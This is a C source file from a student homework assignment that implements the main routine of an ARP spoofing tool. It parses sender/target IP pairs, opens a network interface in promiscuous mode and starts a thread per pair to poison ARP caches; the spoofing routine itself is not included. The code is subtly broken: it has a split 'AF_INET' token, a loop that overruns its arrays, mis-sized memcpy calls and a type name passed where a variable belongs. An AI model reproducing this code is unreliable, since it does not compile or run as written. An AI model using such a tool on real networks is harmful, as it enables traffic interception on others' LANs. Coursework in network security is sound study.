/****************************************************************************************
*											*
*   Subject : Subject 26								*
*   Prof : gilgil									*
*   Student Name : Lim Kyung Dai							* 
*   Student ID : 2015410209								*
*											*
*   - HW3 : arp_spoof programming							*
*											*
****************************************************************************************/

#include <stdio.h>
#include "my_arp_spoof.h"

void usage() {
  printf("syntax: arp_spoof <interface> <senderIP_1> <targetIP_1> [<senderIP_2> <targetIP_2>...]\n");
  printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
  printf("The Number of Maximum pair(sender, target) is 3.\n");
}

int main(int argc, char* argv[])
{
	if ((argc < 4)||(argc > 8) && ((argc % 2) != 0)) {
		usage();
		return -1;
  	}
  
  #define SIZE_ETHERNET 14
	
  struct in_addr senderIP[3], targetIP[3];
  struct in_addr* my_ip_addr;
  u_char my_mac_address[6];
  char* dev = argv[1];
  pthread_t thread[3];
  int i;

  my_ip_addr = (struct in_addr *)malloc(sizeof(struct in_addr));
  get_my_mac(my_mac_address);
  get_my_ip(my_ip_addr,dev);
	
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
	fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	return -1;
  }
  	
  for(i=0;i<(argc*2)+2;i++){
	struct argument *arg;
	arg = (struct argument *)malloc(sizeof(struct argument));
	inet_pton(AF_INET,argv[(i+1)*2], &senderIP[i].s_addr);
	inet_pton(AF_I  NET,argv[(i+1)*2 + 1], &targetIP[i].s_addr);
	memcpy(arg->handle, handle, sizeof(pcap_t *));
	memcpy(arg->my_mac_address, my_mac_address, sizeof(u_char*));
	memcpy(arg->my_ip_addr, my_ip_addr, sizeof(struct in_addr*));
	memcpy(arg->senderIP, &senderIP[i].s_addr, sizeof(senderIP[i].s_addr));
	memcpy(arg->targetIP, &targetIP[i].s_addr, sizeof(targetIP[i].s_addr));
	pthread_create(&thread[i], NULL, modify_arpT, (void *)argument);
 }
} 	
